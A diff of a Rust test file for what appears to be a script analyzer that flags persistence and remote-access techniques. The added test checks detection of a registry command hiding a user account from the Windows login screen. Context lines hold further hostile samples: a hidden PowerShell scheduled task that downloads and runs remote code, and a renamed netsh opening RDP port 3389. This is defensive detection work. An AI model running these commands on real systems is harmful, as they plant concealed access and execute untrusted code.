@@ -3554,6 +3554,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn hidden_user_padded_hex_zero_emits_remote_access_trait() {
+        let script = br#"reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v defaultuserx /t REG_DWORD /d 0x00000000 /f"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "hidden-user" && target == "defaultuserx"
+            )),
+            "padded hex hidden-user registry value was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_netsh_alias_emits_remote_access_trait() {
         let script = br#"copy C:\Windows\System32\netsh.exe C:\Users\Public\ns.tmp
 C:\Users\Public\ns.tmp advfirewall firewall add rule name="Remote Desktop" dir=in protocol=tcp localport=3389 action=allow
